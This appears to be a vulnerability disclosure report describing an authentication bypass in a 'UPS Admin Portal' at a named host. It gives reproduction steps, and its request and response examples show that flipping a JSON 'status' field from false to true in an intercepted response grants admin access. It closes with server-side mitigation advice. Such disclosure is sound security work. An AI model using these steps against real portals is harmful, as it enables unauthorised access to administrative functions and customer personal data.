# Authentication Bypass - UPS Admin Portal

## Summary

I identified an Authentication Bypass vulnerability in the UPS Admin Portal login functionality.

The application accepts user credentials (Username and Password) via a POST request and returns a JSON response containing a `status` field. By intercepting the server response and modifying the `status` value from `false` to `true`, an attacker can bypass authentication and gain administrative access to the application.

This vulnerability occurs because the application trusts client-side values from the server response without performing proper server-side validation. An attacker can use a web proxy (like Burp Suite or OWASP ZAP) to intercept the response and modify the JSON payload to grant admin privileges.

## Vulnerability Type

**Authentication Bypass (Client-Trusted Response Manipulation)**

## Vulnerable Parameters

```text
UserName
Password
```

## Vulnerable URL

```text
https://koko-adminpanel.kzlabs.in/index.php?action=login
```

## Steps to Reproduce

1. Navigate to the vulnerable UPS Admin Portal login page.

2. Enter any credentials (e.g., `admin` / `123`) in the login form.

3. Intercept the login request using Burp Suite, OWASP ZAP, or a similar proxy tool.

4. Observe the server response containing a JSON payload with `"status":false`.

5. Modify the `status` value from `false` to `true`.

6. Forward the modified response to the client.

7. Observe that the application grants administrative access and displays the admin dashboard.

## Payload Used

Original response:
```json
{
  "status": false,
  "errorMessage": "User name and Password does not match."
}
```

Modified response:
```json
{
  "status": true,
  "errorMessage": "User name and Password does not match."
}
```

## Proof of Concept

The application sends a POST request to the server with the user's credentials:

```http
POST /index.php?action=login HTTP/1.1
Host: koko-adminpanel.kzlabs.in
Content-Type: application/json

{
  "UserName": "admin",
  "Password": "123"
}
```

The server responds with a JSON payload:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": false,
  "errorMessage": "User name and Password does not match."
}
```

The vulnerability exists because the application trusts the `status` value from the server response without performing additional server-side validation. By intercepting and modifying the response:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": true,
  "errorMessage": "User name and Password does not match."
}
```

The application grants administrative access based solely on the modified `status` value.

## Impact

This Authentication Bypass vulnerability allows an attacker to:

- Gain administrative access without valid credentials
- View and modify sensitive shipment data
- Access Personally Identifiable Information (PII) of 4,812 customers
- Process returns and approve shipments
- Create new admin accounts or modify user permissions
- Exfiltrate sensitive business data
- Disrupt shipping operations

## Recommendation

To mitigate this vulnerability:

- **Server-Side Validation**: Never trust client-side values for authentication. Perform all authentication checks on the server side.
  ```php
  // Server-side authentication check
  if ($user->authenticate($username, $password)) {
      $_SESSION['authenticated'] = true;
      $_SESSION['user_id'] = $user->id;
      // Set status on the server, not from client
  }
  ```

- **Session Management**: Use secure server-side sessions to track authentication status.

- **JWT Security**: If using JWTs, properly verify signatures and expiration times on the server.

- **API Response Protection**: Do not include sensitive authentication decisions solely in client-accessible response bodies.

- **Response Integrity**: Use cryptographic signatures or checksums to verify response integrity.

- **Rate Limiting**: Implement rate limiting on authentication endpoints to prevent brute-force attacks.

- **Input Validation**: Validate all input parameters before processing.

- **Security Headers**: Implement security headers like `X-Content-Type-Options` and `X-Frame-Options`.

- **Regular Security Audits**: Conduct regular assessments and code reviews to identify vulnerabilities.
